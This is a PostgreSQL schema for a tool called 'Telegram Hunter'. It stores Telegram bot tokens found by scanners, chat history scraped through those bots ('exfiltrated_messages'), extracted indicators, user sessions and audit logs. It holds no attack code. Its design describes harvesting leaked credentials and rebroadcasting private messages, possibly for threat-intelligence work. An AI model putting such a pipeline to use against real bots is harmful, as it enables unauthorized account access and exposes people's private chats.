-- ============================================================
-- Telegram Hunter — Database Schema (canonical, single source of truth)
-- Safe to re-run on a fresh DB: all statements use IF NOT EXISTS guards.
-- Do NOT add migrations/ patches alongside this file — amend here instead.
-- ============================================================


-- ============================================================
-- TABLE: discovered_credentials
-- Stores validated bot tokens found by scanners.
-- bot_token is always Fernet-encrypted at rest.
-- ============================================================
CREATE TABLE IF NOT EXISTS discovered_credentials (
    id           UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    bot_token    TEXT        NOT NULL,                          -- Fernet-encrypted
    token_hash   TEXT        NOT NULL UNIQUE,                   -- SHA-256 for dedup
    chat_id      BIGINT,
    bot_id       TEXT,
    bot_username TEXT,
    chat_name    TEXT,
    chat_type    TEXT,
    source       TEXT,
    status       TEXT        CHECK (status IN ('pending', 'active', 'revoked')) DEFAULT 'pending',
    meta         JSONB       DEFAULT '{}'::jsonb,
    created_at   TIMESTAMPTZ DEFAULT NOW(),
    updated_at   TIMESTAMPTZ DEFAULT NOW(),

    -- Bundle 4: STORED generated columns derived from meta jsonb.
    -- Postgres maintains these automatically — no app writes needed.
    -- Enables real INT sort/filter without jsonb string coercion.
    confidence_score INTEGER GENERATED ALWAYS AS (
        CASE
            WHEN meta ? 'confidence_score'
              AND jsonb_typeof(meta->'confidence_score') = 'number'
            THEN (meta->>'confidence_score')::int
            ELSE NULL
        END
    ) STORED,

    chat_member_count INTEGER GENERATED ALWAYS AS (
        CASE
            WHEN meta ? 'chat_member_count'
              AND jsonb_typeof(meta->'chat_member_count') = 'number'
            THEN (meta->>'chat_member_count')::int
            ELSE NULL
        END
    ) STORED
);

CREATE INDEX IF NOT EXISTS idx_creds_status   ON discovered_credentials(status);
CREATE INDEX IF NOT EXISTS idx_creds_bot_id   ON discovered_credentials(bot_id);

-- Partial indexes for confidence/member sort — only non-null rows indexed,
-- keeps index size bounded since most legacy rows score NULL.
CREATE INDEX IF NOT EXISTS idx_discovered_credentials_confidence_score
    ON discovered_credentials (confidence_score DESC NULLS LAST)
    WHERE confidence_score IS NOT NULL;

CREATE INDEX IF NOT EXISTS idx_discovered_credentials_chat_member_count
    ON discovered_credentials (chat_member_count DESC NULLS LAST)
    WHERE chat_member_count IS NOT NULL;


-- ============================================================
-- TABLE: exfiltrated_messages
-- Chat history scraped from discovered bots.
-- ============================================================
CREATE TABLE IF NOT EXISTS exfiltrated_messages (
    id                   UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    credential_id        UUID        REFERENCES discovered_credentials(id) ON DELETE CASCADE,
    telegram_msg_id      INT         NOT NULL,
    sender_name          TEXT,
    content              TEXT,
    media_type           TEXT        DEFAULT 'text',
    file_meta            JSONB       DEFAULT '{}'::jsonb,
    is_broadcasted       BOOLEAN     DEFAULT FALSE,
    broadcast_claimed_at TIMESTAMPTZ DEFAULT NULL,             -- distributed claim lock
    broadcast_error      JSONB       DEFAULT NULL,             -- last send failure classification
    broadcast_attempts   INT         DEFAULT 0,
    next_retry_at        TIMESTAMPTZ DEFAULT NULL,
    created_at           TIMESTAMPTZ DEFAULT NOW(),
    CONSTRAINT unique_msg_per_credential UNIQUE (credential_id, telegram_msg_id)
);

CREATE INDEX IF NOT EXISTS idx_messages_credential_id
    ON exfiltrated_messages(credential_id);

CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted
    ON exfiltrated_messages(is_broadcasted)
    WHERE is_broadcasted = FALSE;

CREATE INDEX IF NOT EXISTS idx_messages_claimed
    ON exfiltrated_messages(is_broadcasted, broadcast_claimed_at);

CREATE INDEX IF NOT EXISTS idx_messages_next_retry
    ON exfiltrated_messages(is_broadcasted, next_retry_at)
    WHERE is_broadcasted = FALSE;

CREATE INDEX IF NOT EXISTS idx_messages_broadcasted_true
    ON exfiltrated_messages(is_broadcasted)
    WHERE is_broadcasted = TRUE;


-- ============================================================
-- TABLE: monitor_stats
-- Maintained aggregate counters for /monitor/stats.
-- Keep this endpoint O(1) as exfiltrated_messages grows.
-- ============================================================
CREATE TABLE IF NOT EXISTS monitor_stats (
    id BOOLEAN PRIMARY KEY DEFAULT TRUE,
    credentials_total BIGINT NOT NULL DEFAULT 0,
    credentials_active BIGINT NOT NULL DEFAULT 0,
    messages_exfiltrated BIGINT NOT NULL DEFAULT 0,
    messages_broadcasted BIGINT NOT NULL DEFAULT 0,
    refreshed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    CONSTRAINT monitor_stats_singleton CHECK (id = TRUE)
);

INSERT INTO monitor_stats (
    id,
    credentials_total,
    credentials_active,
    messages_exfiltrated,
    messages_broadcasted,
    refreshed_at
)
SELECT
    TRUE,
    (SELECT COUNT(*) FROM discovered_credentials),
    (SELECT COUNT(*) FROM discovered_credentials WHERE status = 'active'),
    (SELECT COUNT(*) FROM exfiltrated_messages),
    (SELECT COUNT(*) FROM exfiltrated_messages WHERE is_broadcasted = TRUE),
    NOW()
ON CONFLICT (id) DO UPDATE SET
    credentials_total = EXCLUDED.credentials_total,
    credentials_active = EXCLUDED.credentials_active,
    messages_exfiltrated = EXCLUDED.messages_exfiltrated,
    messages_broadcasted = EXCLUDED.messages_broadcasted,
    refreshed_at = EXCLUDED.refreshed_at;

CREATE OR REPLACE FUNCTION monitor_stats_credentials_delta()
RETURNS trigger
LANGUAGE plpgsql
AS $$
BEGIN
    IF TG_OP = 'INSERT' THEN
        UPDATE monitor_stats
        SET
            credentials_total = credentials_total + 1,
            credentials_active = credentials_active + CASE WHEN NEW.status = 'active' THEN 1 ELSE 0 END,
            refreshed_at = NOW()
        WHERE id = TRUE;
        RETURN NEW;
    ELSIF TG_OP = 'DELETE' THEN
        UPDATE monitor_stats
        SET
            credentials_total = GREATEST(credentials_total - 1, 0),
            credentials_active = GREATEST(credentials_active - CASE WHEN OLD.status = 'active' THEN 1 ELSE 0 END, 0),
            refreshed_at = NOW()
        WHERE id = TRUE;
        RETURN OLD;
    ELSIF TG_OP = 'UPDATE' AND OLD.status IS DISTINCT FROM NEW.status THEN
        UPDATE monitor_stats
        SET
            credentials_active = GREATEST(
                credentials_active
                - CASE WHEN OLD.status = 'active' THEN 1 ELSE 0 END
                + CASE WHEN NEW.status = 'active' THEN 1 ELSE 0 END,
                0
            ),
            refreshed_at = NOW()
        WHERE id = TRUE;
    END IF;

    RETURN NEW;
END;
$$;

CREATE OR REPLACE FUNCTION monitor_stats_messages_delta()
RETURNS trigger
LANGUAGE plpgsql
AS $$
BEGIN
    IF TG_OP = 'INSERT' THEN
        UPDATE monitor_stats
        SET
            messages_exfiltrated = messages_exfiltrated + 1,
            messages_broadcasted = messages_broadcasted + CASE WHEN NEW.is_broadcasted = TRUE THEN 1 ELSE 0 END,
            refreshed_at = NOW()
        WHERE id = TRUE;
        RETURN NEW;
    ELSIF TG_OP = 'DELETE' THEN
        UPDATE monitor_stats
        SET
            messages_exfiltrated = GREATEST(messages_exfiltrated - 1, 0),
            messages_broadcasted = GREATEST(messages_broadcasted - CASE WHEN OLD.is_broadcasted = TRUE THEN 1 ELSE 0 END, 0),
            refreshed_at = NOW()
        WHERE id = TRUE;
        RETURN OLD;
    ELSIF TG_OP = 'UPDATE' AND OLD.is_broadcasted IS DISTINCT FROM NEW.is_broadcasted THEN
        UPDATE monitor_stats
        SET
            messages_broadcasted = GREATEST(
                messages_broadcasted
                - CASE WHEN OLD.is_broadcasted = TRUE THEN 1 ELSE 0 END
                + CASE WHEN NEW.is_broadcasted = TRUE THEN 1 ELSE 0 END,
                0
            ),
            refreshed_at = NOW()
        WHERE id = TRUE;
    END IF;

    RETURN NEW;
END;
$$;

DROP TRIGGER IF EXISTS trg_monitor_stats_credentials_delta ON discovered_credentials;
CREATE TRIGGER trg_monitor_stats_credentials_delta
AFTER INSERT OR UPDATE OF status OR DELETE ON discovered_credentials
FOR EACH ROW EXECUTE FUNCTION monitor_stats_credentials_delta();

DROP TRIGGER IF EXISTS trg_monitor_stats_messages_delta ON exfiltrated_messages;
CREATE TRIGGER trg_monitor_stats_messages_delta
AFTER INSERT OR UPDATE OF is_broadcasted OR DELETE ON exfiltrated_messages
FOR EACH ROW EXECUTE FUNCTION monitor_stats_messages_delta();

CREATE OR REPLACE FUNCTION get_monitor_stats()
RETURNS TABLE (
    credentials_total BIGINT,
    credentials_active BIGINT,
    messages_exfiltrated BIGINT,
    messages_broadcasted BIGINT
)
LANGUAGE sql
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
    SELECT
        ms.credentials_total,
        ms.credentials_active,
        ms.messages_exfiltrated,
        ms.messages_broadcasted
    FROM monitor_stats AS ms
    WHERE ms.id = TRUE;
$$;

REVOKE ALL ON FUNCTION get_monitor_stats() FROM PUBLIC;
GRANT EXECUTE ON FUNCTION get_monitor_stats() TO service_role;


-- ============================================================
-- TABLE: telemetry_indicators
-- Structured endpoints and indicators extracted from messages.
-- ============================================================
CREATE TABLE IF NOT EXISTS telemetry_indicators (
    id              UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    credential_id   UUID        REFERENCES discovered_credentials(id) ON DELETE CASCADE,
    message_id      UUID        REFERENCES exfiltrated_messages(id) ON DELETE CASCADE,
    indicator_type  VARCHAR(64) NOT NULL,
    indicator_value TEXT        NOT NULL,
    first_seen_at   TIMESTAMPTZ DEFAULT NOW(),
    raw_context     JSONB       DEFAULT '{}'::jsonb,
    CONSTRAINT unique_indicator_per_message UNIQUE(message_id, indicator_type, indicator_value)
);

CREATE INDEX IF NOT EXISTS idx_telemetry_indicators_type_val
    ON telemetry_indicators(indicator_type, indicator_value);

CREATE INDEX IF NOT EXISTS idx_telemetry_indicators_cred
    ON telemetry_indicators(credential_id);


-- ============================================================
-- TABLE: telegram_accounts
-- User sessions added via /starthunter bot command.
-- ============================================================
CREATE TABLE IF NOT EXISTS telegram_accounts (
    id           UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    phone        TEXT        NOT NULL UNIQUE,
    session_path TEXT        NOT NULL,
    status       TEXT        CHECK (status IN ('active', 'inactive')) DEFAULT 'active',
    locked_by    TEXT,                                          -- distributed session lease
    locked_until TIMESTAMPTZ,
    created_at   TIMESTAMPTZ DEFAULT NOW(),
    updated_at   TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_accounts_phone  ON telegram_accounts(phone);
CREATE INDEX IF NOT EXISTS idx_accounts_status ON telegram_accounts(status);


-- ============================================================
-- TABLE: audit_logs
-- Persists high-importance security audit events.
-- Written by AuditLogger._persist_to_db() for compliance.
-- ============================================================
CREATE TABLE IF NOT EXISTS audit_logs (
    id            UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    timestamp     TIMESTAMPTZ DEFAULT NOW(),
    event_type    TEXT        NOT NULL,
    credential_id UUID        REFERENCES discovered_credentials(id) ON DELETE SET NULL,
    user_agent    TEXT        DEFAULT 'system',
    success       BOOLEAN     DEFAULT TRUE,
    details       JSONB       DEFAULT '{}'::jsonb
);

CREATE INDEX IF NOT EXISTS idx_audit_event_type ON audit_logs(event_type);
CREATE INDEX IF NOT EXISTS idx_audit_timestamp  ON audit_logs(timestamp);


-- ============================================================
-- TABLE: keepalive_log
-- Heartbeat records written by the keepalive system task.
-- ============================================================
CREATE TABLE IF NOT EXISTS keepalive_log (
    id         UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    status     TEXT        DEFAULT 'ok'
);


-- ============================================================
-- VIEW: discovered_credentials_public
-- Safe anon projection: excludes bot_token, token_hash,
-- bot_id/username, chat_id/name/type (PII / operational secrets).
-- Frontend and Supabase anon key queries hit this, never the raw table.
-- ============================================================
DROP VIEW IF EXISTS discovered_credentials_public;
CREATE VIEW discovered_credentials_public AS
SELECT
    id,
    created_at,
    source,
    status,
    meta,
    confidence_score,
    chat_member_count
FROM discovered_credentials;

GRANT SELECT ON discovered_credentials_public TO anon;
